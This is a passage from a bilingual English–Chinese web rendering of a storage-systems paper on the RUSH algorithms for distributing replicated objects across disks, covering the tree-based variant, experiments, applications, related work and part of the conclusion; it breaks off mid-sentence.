title="2.5、RUSHt: 基于树的方法"></a>2.5、RUSHt: 基于树的方法</h2><p>RUSHt was devised to increase the scalability of RUSH by allowing computation time to scale logarithmically with the number of sub-clusters in the system. It also offers more flexibility in the ways in which a system can be reorganized. It accomplishes this with some sacrifice in the competitiveness of its reorganizations, as described in Section 3.4.</p><p>RUSHt 的设计目的是通过允许计算时间随系统中子集群数量呈对数增长来提高 RUSH 的可扩展性。它还为系统重组的方式提供了更大的灵活性。如第 3.4 节所述，它以牺牲重组的竞争力为代价来实现这一点。</p><p>RUSHt is similar to RUSHp, except that it uses a binary tree data structure rather than a list. Each node in the tree knows the total weight to the left and right of the node, and each nodes has a unique identifier which is used as a parameter to the hash function.</p><p>RUSHt 与 RUSHp 类似，不同之处在于它使用二叉树数据结构而非列表。树中的每个节点都知道其左右两侧的总权重，并且每个节点都有一个唯一的标识符，用作哈希函数的参数。</p><p>As with the other RUSH variants, RUSHt first looks up the sub-cluster in which an object replica belongs. The RUSHt algorithm, shown in Figure 4(b) accomplishes this by calculating the hash of the key of the object, parameterized by the unique index of the current node (starting with the root). RUSHt then compares this hash value to the ratio between the amount of weight to the left of the current node and the total amount of weight to the left and right of the node. If the hash value is less than this ratio, then the object belongs to the left of the current node, otherwise, it belongs to the right. This process is repeated until a sub-cluster leaf node is reached.</p><p>与其他 RUSH 变体一样，RUSHt 首先查找对象副本所属的子集群。图 4(b) 所示的 RUSHt 算法通过计算对象键的哈希值来实现此目的，该哈希值由当前节点的唯一索引（以根节点）。然后，RUSHt 将此哈希值与当前节点左侧的权重与该节点左右两侧权重总和的比率进行比较。如果哈希值小于该比率，则该对象属于当前节点的左侧，否则属于右侧。此过程重复进行，直至到达子集群的叶节点。</p><div><p><img src="/assets/images/rush-figure-4.png" alt="Figure 4. Pseudo-code for the RUSHT algorithm." loading="lazy"></p></div><p>A tree illustrating the result of this process for a system with five subclusters is show in Figure 4(c).</p><p>图 4(c) 显示了具有五个子集群的系统的此过程的结果。</p><p>Once the replica’s sub-cluster has been found, RUSHt then determines the specific server in the sub-cluster on which to place the object replica in the same way that RUSHp does, described in Section 2.3. The technique used in RUSHp for allowing sub-clusters to be smaller than the replication factor does not work, however, for RUSHt ; this is perhaps the main drawback of RUSHt.</p><p>一旦找到副本的子集群，RUSHt 就会按照 2.3 节中描述的方式，确定子集群中放置对象副本的具体服务器。然而，RUSHp 中允许子集群小于复制因子的技术在 RUSHt 中并不适用；这或许是 RUSHt 的主要缺点。</p><p>When a system gains additional sub-clusters or is otherwise reorganized, RUSHt must ensure that nodes in the tree always have the same unique identifier. This is done by allocating binary identifiers starting with the leftmost leaf (the original sub-cluster in the system), allocating that leaf the identifier “1”. To add a new root node, shift the root’s identifier one bit to the left, copy the identifiers from the left subtree to the right subtree, and append a “1” on the left hand side of every identifier in the right hand subtree, pruning off any unused branches.4 A tree illustrating the result of this process for a system with five sub-clusters is show in Figure 4(c).</p><p>当系统获得额外的子集群或进行重组时， RUSHt 必须确保树中的节点始终具有相同的唯一标识符。这是通过从最左边的叶子节点（系统中的原始子集群）开始分配二进制标识符来实现的，并为该叶子节点分配标识符 “1”。要添加新的根节点，请将根节点的标识符向左移动一位，将左子树中的标识符复制到右子树，并在右子树中每个标识符的左侧添加一个 “1”，并修剪掉所有未使用的分支。下图展示了图 4(c) 显示了具有五个子集群的系统的该过程的结果。</p><h1 id="3、RUSH-实践"><a href="#3、RUSH-实践" class="headerlink" title="3、RUSH 实践"></a>3、RUSH 实践</h1><p>Since the RUSH family of algorithms was designed to allocate data in petabyte-scale storage systems, we measured its behavior under different situations to show that RUSH does, indeed, meet its design goals. In this section we describe a series of experiments that illustrate various characteristics of each of the RUSH variants. All measurements were performed on a 2.8 GHz Pentium 4 machine.</p><p>由于 RUSH 系列算法旨在在 PB 级存储系统中分配数据，我们测量了其在不同情况下的行为，以证明 RUSH 确实达到了其设计目标。本节将描述一系列实验，以说明 RUSH 各个变体的不同特性。所有测量均在 2.8 GHz Pentium 4 计算机上进行。</p><h2 id="3-1、对象查找性能"><a href="#3-1、对象查找性能" class="headerlink" title="3.1、对象查找性能"></a>3.1、对象查找性能</h2><p>In our first experiment, we examine the performance characteristics of RUSH. Informally, in the worst case, RUSHp and RUSHr must iterate over every sub-cluster in the system, doing a constant amount of work in each subcluster, so the lookup time of RUSHp and RUSHr grows linearly with the number of sub-clusters in the system. RUSHt on the other hand, uses a binary tree to locate the correct sub-cluster, again doing constant work at each node, so lookup time is logarithmic in the number of sub-clusters in the system.</p><p>在我们的第一个实验中，我们考察了 RUSH 的性能特征。通俗地说，在最坏的情况下，RUSHp 和 RUSHr 必须遍历系统中的每个子集群，在每个子集群中执行恒定的工作量，因此 RUSHp 和 RUSHr 的查找时间会随着系统中子集群的数量线性增长。另一方面，RUSHt 使用二叉树来定位正确的子集群，同样在每个节点上执行恒定的工作量，因此查找时间与系统中子集群的数量呈对数关系。</p><p>The lookup time for RUSHp and RUSHr, however, also varies depending on the weighting in the system. If the most recently added disks have higher weight than previously added disks, then the lookup process will tend to stop after only examining the most recently added sub-clusters. Since newer disks will tend to have greater capacity and and throughput, we expect newer disks to have higher weight, and thus we expect the performance of RUSHp and RUSHr to be sub-linear.</p><p>然而，RUSHp 和 RUSHr 的查找时间也会根据系统中的权重而变化。如果最近添加的磁盘比之前添加的磁盘具有更高的权重，那么查找过程往往会在仅检查最近添加的子集群后停止。由于较新的磁盘往往具有更大的容量和吞吐量，我们预计较新的磁盘将具有更高的权重，因此我们预计 RUSHp 和 RUSHr 的性能将是亚线性的。</p><p>Since RUSHt must always traverse a tree regardless of the weightings of the sub-clusters in the system, weighting does not affect the performance of RUSHt . This may be advantageous in systems where quality of service guarantees are important.</p><p>由于 RUSHt 必须始终遍历树，而不管系统中子集群的权重如何，因此权重不会影响 RUSHt 的性能。这在注重服务质量保证的系统中可能具有优势。</p><p>To perform the experiments in this section, we started with a system with only a single sub-cluster. We then looked up four million object replicas, and took the average time for a lookup. Two more sub-clusters were added, and the process repeated; this was done until we reached 100 sub-clusters. Figure 5(a) shows the performance of RUSHp and RUSHr where each sub-cluster has the same weight, and where the weight in each sub-cluster increases exponentially, by a factor of 1.1. Figure 5(b) shows the shape of the performance curve for RUSHt . As expected, lookup times for RUSHt increased logarithmically with the number of sub-clusters in the system. The timing is so much faster than RUSHp and RUSHr that it does not show up on Figure 5—lookups required less than one microsecond even after 100 clusters had been added. The unevenness of the RUSHt line is due to the limited resolution of the timer on our system. If performance is an issue, mappings done by RUSHp and RUSHr can be cached because mappings of object replicas to disks do not change unless the system configuration is changed.</p><p>为了执行本节中的实验，我们首先从只有一个子集群的系统开始。然后，我们查找了四百万个对象副本，并计算了平均查找时间。之后，我们又添加了两个子集群，并重复此过程；直到达到 100 个子集群。图 5(a) 展示了 RUSHp 和 RUSHr 的性能，其中每个子集群具有相同的权重，并且每个子集群中的权重呈指数增长，增加 1.1 倍。图 5(b) 展示了 RUSHt 性能曲线的形状。正如预期的那样，RUSHt 的查找时间随着系统中子集群数量的增加而呈对数增长。其时间比 RUSHp 和 RUSHr 快得多，以至于在图 5 中没有体现出来——即使在添加了 100 个集群之后，查找时间也仅需不到一微秒。RUSHt 曲线的不均匀是由于我们系统上计时器的分辨率有限造成的。如果性能是一个问题，RUSHp 和 RUSHr 完成的映射可以被缓存，因为映射除非系统配置发生变化，否则对象副本到磁盘的数量不会改变。</p><div><p><img src="/assets/images/rush-figure-5.png" alt="Figure 5. Per-object-replica lookup times as the number of sub-clusters in the system varies, under two weighting scenarios." loading="lazy"></p></div><h2 id="3-2、对象分布"><a href="#3-2、对象分布" class="headerlink" title="3.2、对象分布"></a>3.2、对象分布</h2><p>In this experiment, we tested the ability of RUSH to distribute objects according to a distribution of weights over sub-clusters. We inserted 10,000 objects with 4 replicas each into 3 sub-clusters of 5 disks each. Each sub-cluster has twice the weight of the sub-cluster to its left.</p><p>在本实验中，我们测试了 RUSH 根据子集群权重分布来分配对象的能力。我们将 10,000 个对象（每个对象包含 4 个副本）插入到 3 个子集群（每个集群包含 5 个磁盘）。每个子集群的权重是其左侧子集群的两倍。</p><p>Figure 6 shows the results of this experiment. Even with only 40,000 object replicas, all of the RUSH variants place objects almost exactly according to the appropriate weight. The leftmost bar in the figure shows the ideal value; none of the RUSH variants differ greatly from this ideal distribution.</p><p>图 6 展示了本次实验的结果。即使只有 40,000 个对象副本，所有 RUSH 变体也几乎完全按照适当的权重放置对象。图中最左侧的柱状图显示了理想值；所有 RUSH 变体与该理想分布均无太大差异。</p><div><p><img src="/assets/images/rush-figure-6.png" alt="Figure 6. The distribution of object replicas over three sub-clusters with five disks each for RUSHp, RUSHr and RUSHt." loading="lazy"></p></div><h2 id="3-3、故障恢复能力"><a href="#3-3、故障恢复能力" class="headerlink" title="3.3、故障恢复能力"></a>3.3、故障恢复能力</h2><p>In this experiment, we studied the behavior of the system when a disk fails. When a disk fails, the disks which hold replicas of the objects stored on the failed disk must service requests which would have been serviced by the failed disk. In addition, these disks must devote some percentage of their resources to failure recovery once the failed disk has been replaced. We call this extra workload failure load.</p><p>在本实验中，我们研究了磁盘发生故障时系统的行为。当磁盘发生故障时，保存故障磁盘上对象副本的磁盘必须处理原本由故障磁盘处理的请求。此外，在故障磁盘被替换后，这些磁盘必须投入一定比例的资源用于故障恢复。我们称之为额外的工作负载故障负载。</p><p>The more evenly distributed the replicas of objects from the failed disk, the more evenly distributed the failure load. In order to minimize service degradation and cascading failures, RUSH distributes the replicas of objects on a particular disk over the entire system. These replicas are distributed according the weights of each sub-cluster. We call the distribution of replicas of objects stored on the failed disk the failure distribution.</p><p>故障磁盘上对象的副本分布越均匀，故障负载分布就越均匀。为了最大限度地降低服务降级和级联故障，RUSH 将特定磁盘上对象的副本分布到整个系统。这些副本根据每个子集群的权重进行分布。我们将故障磁盘上存储的对象副本分布称为故障分布。</p><p>Figure 7 shows the failure distribution for disk 8 in a system with 3 sub-clusters of 5 disks each, all evenly weighted. Both RUSHp and RUSHt show a slight tendency to favor disks that are close to the failed disk, while RUSHr shows no such tendency. For comparison, we also examined a system in which the all the replicas of an object are allocated to four adjacent disks. For example, replicas of some object might be distributed to disks 8, 9, 10, and 11. In such a system, when disk 8 fails, replicas of the objects on disk 8 could be located on disks 5, 6, 7, 9, 10 or 11. In comparison to the system that places replicas on adjacent disks, the “favoritism” showed by RUSHp and RUSHt is almost negligible. In systems with more disks and more objects, the favoritism is even less pronounced, especially when compared to a system that distributes replicas to adjacent disks regardless of how many servers are in the system.</p><p>图 7 显示了具有 3 个子集群（每个集群有 5 个磁盘，所有磁盘的权重均等）的系统中磁盘 8 的故障分布。RUSHp 和 RUSHt 都略微倾向于选择靠近故障磁盘的磁盘，而 RUSHr 则没有这种倾向。为了进行比较，我们还研究了一个系统，其中某个对象的所有副本都分配给四个相邻的磁盘。例如，某个对象的副本可能分布到磁盘 8、9、10 和 11。在这样的系统中，当磁盘 8 发生故障时，磁盘 8 上对象的副本可能位于磁盘 5、6、7、9、10 或 11 上。与将副本放置在相邻磁盘上的系统相比，RUSHp 和 RUSHt 表现出的 “偏袒” 几乎可以忽略不计。在具有更多磁盘和更多对象的系统中，这种偏袒就不那么明显了，尤其是与无论系统中有多少台服务器都将副本分发到相邻磁盘的系统相比时。</p><div><p><img src="/assets/images/rush-figure-7.png" alt="Figure 7. The distribution of replicas of objects on disk 8, which has just failed. RUSH variants distribute the load under failure; Next-3 uses adjacent disks for replicas causing imbalanced load under failure." loading="lazy"></p></div><p>Unfortunately, the deviation from the optimal value depends on several complex factors and is therefore difficult to quantify. In RUSHp and RUSHt , the amount of the devi ation depends partly on the number unique coprimes of the size the sub-cluster in which the failure occurred, known as the Euler Totient Function. Despite this difficulty in quantifying the variance, we can see empirically that RUSHr gives the most faithful failure distribution, but that RUSHp and RUSHt are both extremely accurate. Figure 7 is representative of our findings for other system configurations.</p><p>不幸的是，与最优值的偏差取决于几个复杂的因素，因此很难量化。在 RUSHp 和 RUSHt 中，偏差量故障分布的准确性部分取决于发生故障的子集群大小的唯一互质数，即欧拉函数。尽管量化方差存在困难，但我们可以通过经验看出，RUSHr 给出了最可靠的故障分布，但 RUSHp 和 RUSHt 都极其准确。图 7 代表了我们对其他系统配置的发现。</p><h2 id="3-4、重组"><a href="#3-4、重组" class="headerlink" title="3.4、重组"></a>3.4、重组</h2><p>The final experiments described in this paper examined the number of objects that move during four different reorganization scenarios. In the first scenario, a sub-cluster is added to the system. In the second, a single disk is removed from the system, causing the number of disks in a sub-cluster to be adjusted. In the third scenario, the weight of a sub-cluster is increased. In the fourth scenario, an entire sub-cluster is removed from the system. In each of the experiments, the system starts with six sub-clusters with 4 disks each. We added 10,000 objects, each having 4 replicas, and then reorganized the system, counting the number of objects which moved during the reorganization.</p><p>本文描述的最终实验考察了四种不同重组场景下移动的对象数量。在第一种场景中，系统添加了一个子集群。在第二种场景中，从系统中移除一个磁盘，导致子集群中的磁盘数量发生调整。在第三种场景中，增加了一个子集群的权重。在第四种场景中，从系统中移除了一个完整的子集群。在每个实验中，系统初始包含六个子集群，每个集群包含 4 个磁盘。我们添加了 10,000 个对象，每个对象包含 4 个副本，然后重组系统，并计算重组期间移动的对象数量。</p><p>As shown in Figure 8, RUSHp and RUSHr both perform optimally when a sub-cluster is added to the system; in fact, they are theoretically optimal, so any variation is due to small variations in probabilistic distribution. RUSHt is slightly sub-optimal, but is consistently within a small constant factor of the optimal case.</p><p>如图 8 所示，当系统中添加子集群时，RUSHp 和 RUSHr 的性能均达到最佳；事实上，它们在理论上是最优的，因此任何变化都是由概率分布的微小变化引起的。RUSHt 略微次优，但始终在最优情况的一个小常数因子范围内。</p><div><p><img src="/assets/images/rush-figure-8.png" alt="Figure 8. The number of objects which move under various reorganizations." loading="lazy"></p></div><p>RUSH was not designed for a system in which individual disks are removed, as is apparent from the second column in Figure 8. While RUSHr and RUSHt move about three times as many objects as the optimal number, RUSHp moves around ten times as many—over a third of the objects in the system! If removing a disk is necessary, and the number of objects moved is unacceptable, we can take advantage of RUSH’s adjustable replication factors by maintain a list of removed disks. If an object maps to any removed disk, increase its replication factor by one and look up the new replica instead. This process may be repeated until an existing disk is found. While this mechanism clearly causes an optimal number of objects to be moved, it has some limitations. For example, RUSHp and RUSHt both have a maximum replication factor. Also, worst case lookup time increases linearly with the number of removed disks. A more in depth examination of this mechanism is the subject of future research.</p><p>RUSH 的设计初衷并非针对单个磁盘被移除的系统，这一点从图 8 的第二列就可以看出来。虽然 RUSHr 和 RUSHt 移动的物体数量是最佳数量的三倍，但 RUSHp 移动的对象数量大约是原来的十倍——超过系统中三分之一！如果需要移除磁盘，而移动的对象数量不可接受，我们可以利用 RUSH 的可调复制因子，维护一个已移除磁盘的列表。如果某个对象映射到任何已移除的磁盘，则将其复制因子增加一，并查找新的副本。此过程可能会重复，直到找到现有磁盘。虽然这种机制显然会导致移动的对象数量达到最佳，但它也有一些局限性。例如，RUSHp 和 RUSHt 都有一个最大复制因子。此外，最坏情况下的查找时间会随着已移除磁盘的数量线性增加。对这种机制的更深入研究是未来研究的主题。</p><p>The third column of Figure 8 shows that RUSHt and RUSHr perform well when the weight of an entire subcluster is increased, but RUSHp again performs poorly. In both adding (column 3) and removing weight (column 4) from a sub-cluster, RUSHt and RUSHr both perform well, whereas RUSHp does not. This behavior is expected, since RUSHt and RUSHr were designed to allow changing subcluster weights, whereas RUSHp was not.</p><p>图 8 的第三列显示，当整个子簇的权重增加时，RUSHt 和 RUSHr 表现良好，但 RUSHp 再次表现不佳。在添加（第 3 列）和从子簇中移除权重（第 4 列）时，RUSHt 和 RUSHr 均表现良好，而 RUSHp 则表现不佳。这种行为是可以预料的，因为 RUSHt 和 RUSHr 的设计允许更改子簇权重，而 RUSHp 则不允许。</p><h1 id="4、RUSH-的应用"><a href="#4、RUSH-的应用" class="headerlink" title="4、RUSH 的应用"></a>4、RUSH 的应用</h1><p>Each RUSH variant excels in a different environment. While RUSHt offers the best performance and the best overall flexibility in reconfiguration, it does not allow subclusters smaller than the maximum number of a replicas that a single object may have. It also moves more than the optimal number of objects during reorganization, though the number is within a small factor of the optimal number of objects. RUSHt is thus best suited for very large systems in which disks will be added in large numbers. However, for systems which the designers intend to build by adding a very small number of disks at a time (small scale systems) or systems that will be reorganized continuously, one of the other RUSH variants may be better.</p><p>每种 RUSH 变体在不同的环境中都有其优势。虽然 RUSHt 在重新配置方面提供了最佳性能和最佳整体灵活性，但它不允许子集群小于单个对象的最大副本数。在重组过程中，它移动的对象数量也会超过最佳数量，尽管该数量与最佳对象数量相差无几。因此，RUSHt 最适合需要大量添加磁盘的大型系统。然而，对于设计人员打算通过一次添加少量磁盘来构建的系统（小型系统），RUSHt 并不适用。或者将不断重组的系统，其他 RUSH 变体之一可能会更好。</p><p>RUSHr also provides significant flexibility, but at the cost of performance. Since RUSHr performance degrades linearly with the number of sub-clusters in the system, it is not well suited to a system where sub-clusters are added or removed frequently. It also cannot support systems where each “replica” in a replica group is actually a distinct entity rather than an exact copy, as would be the case if “replicas” were used as part of an erasure coding scheme. On the other hand, because RUSHr does not rely on the number theory behind RUSHp and RUSHt , it can allow any replication factor up to the total number of disks in the system. This means that a system using RUSHr has more flexibility in the number of disks that can be removed from the system individually using the mechanism discussed in Section 3.4. It also has more flexibility to use a “fast mirroring copy” technique [21] to increase the mean time to data loss in a system.</p><p>RUSHr 也提供了显著的灵活性，但却以牺牲性能为代价。由于 RUSHr 的性能会随着系统中子集群数量的增加而线性下降，因此它不太适合频繁添加或删除子集群的系统。它也无法支持副本组中的每个 “副本” 实际上是一个独立实体而非精确副本的系统（如果 “副本” 被用作纠删码方案的一部分，情况就会如此）。另一方面，由于 RUSHr 不依赖于 RUSHp 和 RUSHt 背后的数论，它可以允许任意复制因子，最高可达系统中磁盘的总数。这意味着使用 RUSHr 的系统在使用 3.4 节中讨论的机制从系统中单独移除的磁盘数量方面具有更大的灵活性。它还可以更灵活地使用 “快速镜像复制” 技术 [21] 来增加系统中数据丢失的平均时间。</p><p>RUSHp offers similar behavior to RUSHr, except that it supports erasure coding. This ability comes at the expense of not being able to remove sub-clusters once they are added (without significant reorganization costs). RUSHp also requires that the replication factor in the system be less than or equal to the number of disks in the first sub-cluster added to the system, but subsequent sub-clusters need not have sufficient disks to hold all of the replicas of a single object on unique disks. In that respect, it is more flexible than RUSHt , but less flexible than RUSHr.</p><p>RUSHp 的行为与 RUSHr 类似，但前者支持纠删码。此功能的代价是，一旦添加子集群，就无法移除（无需大量的重组成本）。RUSHp 还要求系统中的复制因子小于或等于添加到系统的第一个子集群的磁盘数量，但后续子集群无需拥有足够的磁盘空间来将单个对象的所有副本存储在唯一的磁盘上。从这个方面来看，它比 RUSHt 更灵活，但不如 RUSHr 灵活。</p><p>Because RUSHt’s performance does not depend on the weighting of the sub-clusters, and objects on every subcluster can be located in the same amount of time, RUSHt can make better quality of service guarantees.</p><p>由于 RUSHt 的性能不依赖于子集群的权重，并且每个子集群上的对象都可以在相同的时间内被定位，因此 RUSHt 可以做出更好的服务质量保证。</p><p>Table 2 gives a side-by-side comparison of the features of the RUSH variants and Linear Hashing variants [14], simple hashing, and a tabular, or “directory” approach. An “X” indicates that the algorithm supports the feature and “- “ indicates that it supports the feature under some circumstances. The “tabular” approach keeps a centralized table, possibly cached in part on the clients, containing pointersto all of the object replicas. It has “-“ instead of “X” because the approach neither rules out nor ensures any of these features. In fact, RUSH could be used to generate and maintain the table in such a system. Any such system has the same constraints to RUSH: it must guarantee that no two replicas of the same object are on the same disk and support weighting.</p><p>表 2 并排比较了 RUSH 变体与线性哈希变体 [14]、简单哈希以及表格或 “目录” 方法的特性。”X” 表示该算法支持该特性， “” 表示在某些情况下支持该特性。 “表格” 方法维护一个集中式表，可能部分缓存在客户端上，其中包含指向所有对象副本的指针。它用 “-“ 而不是 “X” 是因为该方法既不排除也不保证任何这些特性。事实上， RUSH 可用于在这样的系统中生成和维护表格。任何这样的系统都有与 RUSH 相同的约束: 它必须保证同一对象的任何两个副本不会位于同一磁盘上，并且支持加权。</p><div><p><img src="/assets/images/rush-table-2.png" alt="Table 2. Features of RUSH and three other related algorithms&#x2F;distribution mechanisms. SH refers to simple hashing, and Tab is a simple tabular approach." loading="lazy"></p></div><p>We conclude this section by giving a brief example of a system best suited to each of the RUSH variants. In a small system such as a small storage server or a replicated object database, the user does not necessarily want to add several disks or servers at once. In that case RUSHp or RUSHr is more appropriate. In the case of a small storage server, storage space is typically a more important issue that in an object database, where transaction speed is often more important. For that reason, RUSHp, which supports erasure coding, is probably more suited to a small storage server, whereas RUSHr is probably more suited to an object database because of the added flexibility in configuration. Large storage systems, on the other hand, typically add many disks at once, and therefore are not constrained by the need to add a minimum numbers of disks to the system at once. Very large storage clusters are also typically very performance sensitive. Because RUSHt provides the best performance both in terms of lookup times and reorganizations, and because of its flexibility in configuration and reconfiguration, RUSHt is most appropriate for very large storage systems, such as the one we are designing in the Storage Systems Research Center at the University of California, Santa Cruz.</p><p>我们将通过简要介绍最适合每种 RUSH 变体的系统示例来结束本节。在小型系统（例如小型存储服务器或复制对象数据库）中，用户不一定希望一次添加多个磁盘或服务器。在这种情况下，RUSHp 或 RUSHr 更为合适。对于小型存储服务器，存储空间通常比对象数据库更重要，因为对象数据库的事务速度通常更为重要。因此，支持纠删码的 RUSHp 可能更适合小型存储服务器，而 RUSHr 可能更适合对象数据库，因为它增加了配置灵活性。另一方面，大型存储系统通常会一次添加许多磁盘，因此不受一次向系统添加最少磁盘数量的限制。超大型存储集群通常也对性能非常敏感。由于 RUSHt 在查找时间和重组方面均提供了最佳性能，并且由于其在配置和重新配置方面的灵活性，因此 RUSHt 最适合非常大的存储系统，例如我们正在加州大学圣克鲁斯分校的存储系统研究中心设计的系统。</p><h1 id="5、相关工作"><a href="#5、相关工作" class="headerlink" title="5、相关工作"></a>5、相关工作</h1><p>The topic of Scalable Distributed Data Structures (SDDS) has received considerable attention. Litwin, et al. have developed many distributed variants of Linear Hashing which incorporate features such as erasure coding and security. The original <code>LH*</code> paper provides an excellent introduction to the <code>LH*</code> variants[14]. <code>LH*</code> unfortunately does not use disk space optimally [2], and results in a “hotspot” of disk and network activity during reorganizations. More importantly, <code>LH*</code> does not support weighting, and distributes data in such a way that increases the likelihood of correlated failures or performance degradations. Other data structures such as DDH [7] suffer from similar issues in utilizing space efficiently. Kr¨oll and Widmayer [12] propose tree-based SDDSs called Distributed Random Trees which allow for complex queries such as range queries. DRTs do not support data replication (although the authors discuss metadata replication), and their worst case performance is linear in the number of disks in the system. Litwinet al. also propose a B-Tree based family called <code>RP*</code> [13], which suffers from problems similar to <code>LH*</code>.</p><p>可扩展分布式数据结构 (SDDS) 的主题已获得广泛关注。Litwin 等人开发了许多分布式线性哈希变体，这些变体融合了纠删码和安全性等特性。最初的 <code>LH*</code> 论文对 <code>LH*</code> 变体进行了精彩的介绍[14]。遗憾的是，<code>LH*</code> 未能以最优方式利用磁盘空间 [2]，导致重组期间磁盘和网络活动出现 “热点” 。更重要的是，<code>LH*</code> 不支持加权，其数据分布方式增加了相关故障或性能下降的可能性。其他数据结构，例如 DDH [7]，在高效利用空间方面也存在类似的问题。Kr¨oll 和 Widmayer [12] 提出基于树的分布式随机树（SDDS）被称为分布式随机树（DRT），它允许执行诸如范围查询之类的复杂查询。DRT 不支持数据复制（尽管作者讨论了元数据复制），并且其最坏情况下的性能与系统中的磁盘数量呈线性关系。Litwin 等人还提出了一个基于 B 树的 <code>RP*</code> 家族[13]，它存在与 <code>LH*</code> 类似的问题。</p><p>Choy, et al. [5] describe algorithms for distributing data over disks which move an optimal number of objects as disks are added. These algorithms do not support weighting, replication, or disk removal. Brinkmann, et al. [3] propose a method to distribute data by partitioning the unit range. Their algorithm features 2-competitive reorganizations and supports weighting but not replication; it was extended by Wu and Burns [20] to map file sets, rather than files, to the unit range using a method similar to our technique of mapping objects to replica groups. SCADDAR [8] explored algorithms for assigning media blocks to disks in a system in which disks are added and removed. SCADDAR uses remapping functions similar in flavor to those in RUSH, but does not support replication beyond simple offset-based replication as discussed in Section 3.3. Consistent hashing [11] has many of the qualities of RUSH, but has a high migration overhead and is less well-suited to read-write file systems; Tang and Yang [18] use consistent hashing as part of a scheme to distribute data in large-scale storage clusters.</p><p>Choy 等人 [5] 描述了在磁盘上分发数据的算法，这些算法在添加磁盘时移动最佳数量的对象。这些算法不支持加权、复制或磁盘移除。Brinkmann 等人 [3] 提出了一种通过划分单位范围来分发数据的方法。他们的算法具有 2 竞争重组，支持加权但不支持复制；Wu 和 Burns [20] 对其进行了扩展，使用类似于我们将对象映射到副本组的技术的方法将文件集（而不是文件）映射到单位范围。SCADDAR [8] 探索了在添加和移除磁盘的系统中将介质块分配给磁盘的算法。SCADDAR 使用与 RUSH 类似的重映射函数，但不支持除 3.3 节中讨论的简单的基于偏移量的复制之外的复制。一致性哈希 [11] 具有 RUSH 的许多特性，但迁移开销很高，不太适合读写文件系统； Tang 和 Yang [18] 使用一致性哈希作为在大型存储集群中分发数据的方案的一部分。</p><p>Chau and Fu discuss algorithms to support graceful degradation of performance during failures in declustered RAID systems [4]. As discussed in Section 3.3, our algorithms also feature graceful degradation of performance during failures.</p><p>Chau 和 Fu 讨论了支持分簇 RAID 系统在故障期间性能优雅降级的算法 [4]。如 3.3 节所述，我们的算法也支持在故障期间性能优雅降级。</p><p>Peer-to-peer systems such as CFS [6], PAST [17], and Gnutella [16] assume that storage nodes are extremely unreliable. Consequently, data has a very high degree of replication. Furthermore, most of these systems make no attempt to guarantee long term persistence of stored objects. In some cases, objects may be “garbage collected” at any time by users who no longer want to store particular objects on their node, and in others, objects which are seldom used are automatically discarded. Because of the unreliability of individual nodes, these systems use replication for high availability, and are less concerned with maintaining balanced performance across the entire system. Other large scale persistent storage systems such as Farsite [1] and OceanStore [15] provide more file system-like semantics. Objects placed in the file system are guaranteed, within some probability of failure, to remain in the file system until they are explicitly removed. The inefficiencies introduced by the peer-to-peer and wide area storage systems address security, reliability in the face of highly unstable nodes, and client mobility, among other things. However, these features require too much overhead for a tightly coupled high-performance object storage system.</p><p>诸如 CFS [6]、PAST [17] 和 Gnutella [16] 之类的对等系统假设存储节点极不可靠。因此，数据具有极高的复制度。此外，大多数此类系统并未尝试保证存储对象的长期持久性。在某些情况下，对象可能会被不再希望在其节点上存储特定对象的用户随时”垃圾回收”；而在其他情况下，很少使用的对象会被自动丢弃。由于单个节点的不可靠性，这些系统使用复制来实现高可用性，而较少关注维护整个系统的均衡性能。其他大型持久性存储系统，例如 Farsite [1] 和 OceanStore [15]，则提供了更类似于文件系统的语义。在一定的故障概率内，放置在文件系统中的对象可以保证在被明确删除之前一直保留在文件系统中。点对点和广域存储系统带来的低效率问题，主要体现在安全性、在高度不稳定的节点下的可靠性以及客户端的移动性等方面。然而，对于紧密耦合的高性能对象存储系统来说，这些功能需要太多的开销。</p><h1 id="6、未来工作"><a href="#6、未来工作" class="headerlink" title="6、未来工作"></a>6、未来工作</h1><p>One problem with RUSH is that we do not yet know how to calculate the inverse—we can not directly answer the question, “which objects are stored on a given a disk?” We must instead iterate through all possible object identifiers and replica numbers and calculate the disk on which it belongs. We then simply discard all objects that do belong on the disk in question. Some preliminary research, however, suggests that it may be possible to invert RUSH, and enumerate the objects assigned to a particular server. This process involves solving a system of n linear equations, where n represents the number of comparisons necessary to locate the correct subcluster for an object.</p><p>RUSH 的一个问题是，我们尚不清楚如何计算它的逆——我们无法直接回答 “哪些对象存储在给定的磁盘上？” 这个问题。我们必须遍历所有可能的对象标识符和副本编号，并计算出它所属的磁盘。然后，我们直接丢弃所有确实属于该磁盘的对象。然而，一些初步研究表明，或许可以反转 RUSH ，并枚举分配给特定服务器的对象。这个过程涉及求解一个由 n 个线性方程组成的系统，其中 n 表示为某个对象找到正确子集群所需的比较次数。</p><p>We also would like to place theoretical bounds on the the number of objects which can move during a reorganization, and quantify the standard error in the number of objects stored on a particular disk.</p><p>我们还想对重组期间可以移动的对象数量设置理论界限，并量化特定磁盘上存储的对象数量的标准误差。</p><p>We are currently exploring different mechanisms for reducing the impact of removing a single disk either temporarily or permanently from the system.</p><p>我们目前正在探索不同的机制来减少从系统中暂时或永久移除单个磁盘的影响。</p><p>Finally, we are examining the utility of these algorithms for a broader class of applications including an object database and a searchable distributed web cache.</p><p>最后，我们正在研究这些算法对于更广泛的应用程序（包括对象数据库和可搜索的分布式网络缓存）的实用性。</p><h1 id="7、结论"><a href="#7、结论" class="headerlink" title="7、结论"></a>7、结论</h1><p>This paper has provided an overview of a family of algorithms we have developed to distribute objects over disks in a heterogeneous object based storage device. We describe three algorithms: RUSHp, RUSHr and RUSHt . These three algorithms all support weighting of disks, object replication, and near-optimal reorganization in may common scenarios.</p><p>本文概述了我们开发的一系列算法，用于在异构对象存储设备中将对象分布到磁盘上。我们描述了三种算法: RUSHp、RUSHr 和 RUSHt。这三种算法都支持磁盘加权、对象复制以及常见场景下的近乎最优的重组。</p><p>Our experiments show that while all three algorithms can perform lookups very quickly, RUSHt performs an order of magnitude faster in systems which have been reorganized several times. RUSHt also provides the best reorganization behavior under many conditions. This increased flexibility comes at some expense to the range of configurations which are possible for RUSHt . In particular, every subcluster in a system managed by RUSHt must have at least as many disks as an object has replicas. Since small systems will typically have small replication factors, this may or may not be an impediment. Clearly, however, RUSHt is the best algorithms for distributing data over very large clusters of disks.</p><p>我们的实验表明，虽然这三种算法都能非常快速地执行查找，但在经过多次重组的系统中，RUSHt 的执行速度要快一个数量级。RUSHt 在许多条件下也提供了最佳的重组行为。这种灵活性的提升是以牺牲 RUSHt 的配置范围为代价的。具体来说，RUSHt 